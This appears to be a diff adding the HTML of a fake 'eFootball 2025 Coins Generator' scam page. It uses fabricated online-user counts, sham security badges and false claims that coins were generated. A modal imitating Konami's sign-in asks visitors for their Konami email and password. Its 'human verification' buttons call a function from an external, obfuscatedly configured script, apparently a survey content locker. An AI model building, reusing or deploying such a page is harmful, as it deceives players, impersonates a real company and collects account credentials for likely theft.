@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eFootball 2025 Coins Generator</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
+	
+	
+	<script type="text/javascript">
+    var EfMOZ_tEC_oGbrec={"it":4460386,"key":"c64f0"};
+</script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/b59cc6c.js"></script>
+
+</head>
+<body>
+    <div class="background-overlay"></div>
+    <div class="container">
+        <header class="main-header">
+            <h1 class="title-animation">eFootball COINS GENERATOR</h1>
+            <p class="subtitle">Get unlimited eFootball coins for all platforms, with easy steps!</p>
+            <div class="online-users">
+                <i class="fas fa-users"></i>
+                <span id="online-count">2,462</span> USERS ONLINE NOW
+            </div>
+        </header>
+
+        <div class="generator-box">
+           <!-- Updated Platform Selector Section -->
+<div class="platform-selector">
+    <h3>SELECT YOUR PLATFORM</h3>
+    <div class="platform-options">
+        <div class="platform-card" data-platform="ps5">
+            <img src="img/efootball.png" alt="eFootball on PlayStation 5" class="platform-image">
+            <div class="platform-overlay"></div>
+            <div class="platform-name">
+                <div class="platform-name-content">
+                    <i class="fab fa-playstation"></i>
+                    <span class="tier">PlayStation 5</span>
+                </div>
+            </div>
+        </div>
+        <div class="platform-card" data-platform="ps4">
+            <img src="img/efootball.png" alt="eFootball on PlayStation 4" class="platform-image">
+            <div class="platform-overlay"></div>
+            <div class="platform-name">
+                <div class="platform-name-content">
+                    <i class="fab fa-playstation"></i>
+                    <span class="tier">PlayStation 4</span>
+                </div>
+            </div>
+        </div>
+        <div class="platform-card" data-platform="xbox">
+            <img src="img/efootball.png" alt="eFootball on Xbox Series X/S" class="platform-image">
+            <div class="platform-overlay"></div>
+            <div class="platform-name">
+                <div class="platform-name-content">
+                    <i class="fab fa-xbox"></i>
+                    <span class="tier">Xbox Series X/S</span>
+                </div>
+            </div>
+        </div>
+        <div class="platform-card" data-platform="pc">
+            <img src="img/efootball.png" alt="eFootball on PC" class="platform-image">
+            <div class="platform-overlay"></div>
+            <div class="platform-name">
+                <div class="platform-name-content">
+                    <i class="fas fa-desktop"></i>
+                    <span class="tier">PC</span>
+                </div>
+            </div>
+        </div>
+        <div class="platform-card" data-platform="mobile">
+            <img src="img/efootball.png" alt="eFootball on Mobile" class="platform-image">
+            <div class="platform-overlay"></div>
+            <div class="platform-name">
+                <div class="platform-name-content">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span class="tier">Mobile</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+            <!-- Coins Amount Selector -->
+            <div class="coins-selector">
+                <h3>SELECT COINS AMOUNT</h3>
+                <div class="coins-options">
+                    <div class="coins-option" data-coins="300">
+                        <i class="fas fa-coins coins-icon"></i>
+                        <span class="coins-value">300</span>
+                    </div>
+                    <div class="coins-option" data-coins="550">
+                        <i class="fas fa-coins coins-icon"></i>
+                        <span class="coins-value">550</span>
+                    </div>
+                    <div class="coins-option selected" data-coins="750">
+                        <i class="fas fa-coins coins-icon"></i>
+                        <span class="coins-value">750</span>
+                    </div>
+                    <div class="coins-option" data-coins="1040">
+                        <i class="fas fa-coins coins-icon"></i>
+                        <span class="coins-value">1040</span>
+                    </div>
+                </div>
+            </div>
+
+            <button id="connect-button" class="button-generate">
+                <span class="button-text">GENERATE COINS</span>
+                <div class="button-glow"></div>
+            </button>
+            
+            <div class="progress-section">
+                <div id="progress-container" class="progress-container" style="display: none;">
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-glow"></div>
+                        <div class="progress-text">PROCESSING... 0%</div>
+                    </div>
+                </div>
+
+                <div class="status-box" id="status-box">
+                    <div class="status-header">
+                        <i class="fas fa-terminal"></i>
+                        <span>Console Output</span>
+                    </div>
+                    <div class="status-content"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure Connection</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-lock"></i>
+                <span>Encrypted</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-user-shield"></i>
+                <span>Anonymous</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Connecting to eFootball servers...</div>
+        </div>
+    </div>
+
+    <!-- Konami Login Modal -->
+    <div class="konami-login-modal" id="konami-login-modal">
+        <div class="konami-login-content">
+            <div class="konami-login-header">
+                <img src="img/konami-logo.png" alt="Konami Logo" class="konami-logo">
+                <h2 class="konami-login-title">Sign in</h2>
+                <p class="konami-login-subtitle">Log in with your linked Konami account to start generating coins!</p>
+            </div>
+
+            <form class="konami-login-form" id="konami-login-form">
+                <div class="konami-form-group">
+                    <label for="konami-email">
+                        <i class="fas fa-envelope"></i>
+                        Konami ID (Email)
+                    </label>
+                    <input type="email" id="konami-email" required>
+                </div>
+
+                <div class="konami-form-group">
+                    <label for="konami-password">
+                        <i class="fas fa-key"></i>
+                        Password
+                    </label>
+                    <input type="password" id="konami-password" required>
+                </div>
+
+                <div class="konami-form-options">
+                    <div class="stay-signed-in">
+                        <input type="checkbox" id="stay-signed-in">
+                        <label for="stay-signed-in">Stay signed in</label>
+                    </div>
+                    <a href="https://my.konami.net/en_US/password-reminder/input-email-address" target="_blank" rel="noopener" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="konami-login-button" id="konami-login-button" disabled>
+                    <span class="button-text">Sign in</span>
+                    <div class="loading-spinner"></div>
+                </button>
+            </form>
+
+            <div class="konami-login-footer">
+                <div class="security-info">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Your information is secure and encrypted</span>
+                </div>
+                <div class="konami-login-links">
+                    <a href="https://www.konami.com/en/legal/" onclick="return false;">Terms of use</a>
+                    <a href="https://www.konami.com/en/privacy/" onclick="return false;">Privacy policy</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Coin Reward Modal -->
+    <div class="coinsreward-modal" id="coinsreward-modal">
+        <div class="coinsreward-content">
+            <div class="coinsreward-header">
+                <i class="fas fa-coins coinsreward-icon"></i>
+                <h2 class="coinsreward-title">COINS GENERATED SUCCESSFULLY</h2>
+                <p class="coinsreward-text">Your eFootball Coins have been successfully generated!</p>
+            </div>
+
+            <div class="coinsreward-display-section">
+                <div class="coinsreward-label">Your Coins Amount:</div>
+                <div class="coinsreward-box" id="coins-amount">5,000</div>
+                
+                <div class="coinsreward-info">
+                    <div class="platform-info">
+                        Platform: <span id="display-platform">PlayStation 5</span>
+                    </div>
+                </div>
+            </div>
+
+            <button id="claim-button" class="claim-button">
+                <i class="fas fa-check-circle"></i>
+                <span>CLAIM NOW</span>
+            </button>
+            
+            <div class="coinsreward-note">
+                <i class="fas fa-info-circle"></i>
+                <span>These coins will expire in 24 hours if not claimed</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Verification Modal -->
+    <div class="verification-modal" id="verification-modal">
+        <div class="verification-content">
+            <div class="verification-header-main">
+                <i class="fas fa-shield-alt verification-shield-icon"></i>
+                <h2 class="verification-title">HUMAN VERIFICATION</h2>
+                <p class="verification-description">To prevent abuse and ensure fair distribution, we need to verify you're human.</p>
+            </div>
+            
+            <div class="verification-options">
+                <div class="verification-option">
+                    <div class="verification-option-header">
+                        <i class="fas fa-tasks"></i>
+                        <span>Complete a quick survey</span>
+                    </div>
+                    <p class="verification-option-text">Answer a few simple questions about eFootball</p>
+                    <button onclick="_Ut()" class="verification-option-button" id="survey-verify-button">
+                        <i class="fas fa-clipboard-check"></i>
+                        <span>COMPLETE SURVEY</span>
+                    </button>
+                </div>
+                
+                <div class="verification-option">
+                    <div class="verification-option-header">
+                        <i class="fas fa-puzzle-piece"></i>
+                        <span>Solve a captcha</span>
+                    </div>
+                    <p class="verification-option-text">Prove you're not a robot</p>
+                    <button onclick="_Ut()" class="verification-option-button" id="captcha-verify-button">
+                        <i class="fas fa-robot"></i>
+                        <span>SOLVE CAPTCHA</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="verification-footer">
+                <p>Verification helps us prevent bots from abusing our system.</p>
+                <p>Your information is secure and will not be shared.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="success-modal" id="success-modal">
+        <div class="success-content">
+            <div class="success-icon">
+                <svg viewBox="0 0 52 52" class="checkmark">
+                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+            </div>
+
+            <h2 class="success-title">SUCCESS!</h2>
+
+            <div class="coins-display">
+                <i class="fas fa-coins coins-icon animated"></i>
+                <span id="success-coins-amount">5000</span>
+                <span>COINS</span>
+                <i class="fas fa-coins coins-icon animated"></i>
+            </div>
+
+            <div class="reward-details">
+                <p class="success-platform">Platform: <span id="success-platform">PlayStation 5</span></p>
+                <p class="success-account">Account: <span id="success-account">example@konami.com</span></p>
+            </div>
+
+            <p class="success-message">Your eFootball Coins have been successfully added to your account!</p>
+
+            <button class="done-button" id="done-button">
+                <i class="fas fa-check"></i>
+                <span>DONE</span>
+            </button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
